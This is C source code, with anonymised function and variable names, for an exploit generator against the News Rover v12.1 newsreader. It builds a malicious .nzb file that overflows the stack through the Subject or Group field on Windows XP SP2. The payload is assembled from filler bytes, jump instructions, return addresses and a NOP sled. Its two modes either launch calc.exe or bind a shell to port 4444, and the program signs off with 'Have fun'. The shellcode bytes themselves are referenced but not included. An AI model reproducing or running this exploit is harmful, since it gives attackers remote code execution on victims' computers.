
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int FUNC_0 (char*) ;
 char* VAR_0 ;
 char* VAR_1 ;
 int FUNC_1 (int *) ;
 int * FUNC_2 (char*,char*) ;
 int FUNC_3 (int *,char*) ;
 scalar_t__ FUNC_4 (int) ;
 int FUNC_5 (char*,char*,int) ;
 int FUNC_6 (char*,char,int) ;
 char* VAR_2 ;
 char* VAR_3 ;
 int FUNC_7 (char*,...) ;
 scalar_t__ FUNC_8 (char*,int) ;
 int FUNC_9 (char*) ;

int FUNC_10(int VAR_4, char* VAR_5[]) {

FILE *VAR_6;
char * VAR_7;
int VAR_8=0;
int VAR_9=0;
char *VAR_10;
char *VAR_11;

FUNC_7("[+] NZB exploit for News Rover\n");
FUNC_7("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
if (VAR_4>3) {
 VAR_8=FUNC_0(VAR_5[1]);
 VAR_10=VAR_5[3];
 VAR_9=FUNC_0(VAR_5[2]);
 if (!VAR_9)
  VAR_11=VAR_1;
 else
  VAR_11=VAR_0;
}
else {
 FUNC_7("[+] Usage: %s type mode file.nzb\n\n",VAR_5[0]);
 FUNC_7("[+] type is ...\n");
 FUNC_7("0: News Rover v12.1,  Rev. 1 Subject stack overflow. Works on XP SP2 FR\n");
 FUNC_7("1: News Rover v12.1,  Rev. 1 Group stack overflow. Works on XP SP2 FR\n\n");
 FUNC_7("[+] mode is \n");
 FUNC_7("0: Spawns calc.exe\n");
 FUNC_7("1: Binds to 4444\n\n");
 FUNC_7("[+] Ex: %s 0 0 file.nzb",VAR_5[0]);

 return 0;
}

VAR_6=FUNC_2(VAR_10,"wb");

if (VAR_8==0)
{
 FUNC_3(VAR_6,VAR_3);
 FUNC_3(VAR_6,"<file poster=\"Poster\" date=\"1170609233\"\nsubject=\"");
 VAR_7 = (char*)FUNC_4(sizeof(char)*3000+FUNC_9(VAR_11));
 FUNC_6(VAR_7,'A',3000);
 FUNC_5(VAR_7+2022,"\xeb\x15\x90\x90",4);
 FUNC_5(VAR_7+2026,"\x2a\x02\xfc\x7f",4);
 FUNC_6(VAR_7+2030,0x90,15);
 FUNC_5(VAR_7+2045,VAR_11,FUNC_9(VAR_11));
 FUNC_6(VAR_7+2045+FUNC_9(VAR_11),0,1);
 FUNC_6(VAR_7+3000,0,1);
 FUNC_3(VAR_6,VAR_7);
 FUNC_3(VAR_6,"\">\n<groups><group>some group</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">some name");
 FUNC_3(VAR_6,VAR_2);
 FUNC_1(VAR_6);
}
else if (VAR_8==1)
{
 FUNC_3(VAR_6,VAR_3);
 FUNC_3(VAR_6,"<file poster=\"Poster\" date=\"1170609233\" subject=\"Some Subj\">\n");
 FUNC_3(VAR_6,"<groups><group>alt.bdffs</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">no matter the name</segment>\n</segments>\n</file>");
 FUNC_3(VAR_6,"\n\n<file poster=\"Poster\" date=\"1170609233\" subject=\"Some Subj\">\n");
 FUNC_3(VAR_6,"<groups><group>");

 VAR_7 = (char*)FUNC_4(sizeof(char)*100);
 FUNC_6(VAR_7,'A',100);
 FUNC_5(VAR_7,"\x90\xb8\x33\x33\x33\x33\x2D\x13\x27\x33\x33\x8B\x04\x04\x40\xFF\xD0",17);
 FUNC_5(VAR_7+94,"\x53\xF1\xD1\x77\00",5);
 FUNC_3(VAR_6,VAR_7);
 FUNC_3(VAR_6,"</group></groups>\n<segments>\n<segment bytes=\"30\" number=\"1\">");
 VAR_7=(char *)FUNC_8(VAR_7,sizeof(char)*3000);
 FUNC_6(VAR_7,'A',3000);
 FUNC_5(VAR_7+1500,VAR_11,FUNC_9(VAR_11));
 FUNC_6(VAR_7+3000,0,1);
 FUNC_3(VAR_6,VAR_7);
 FUNC_3(VAR_6,VAR_2);
 FUNC_1(VAR_6);
}


FUNC_7("[+] File generated! Have fun\n");
return 0;
}
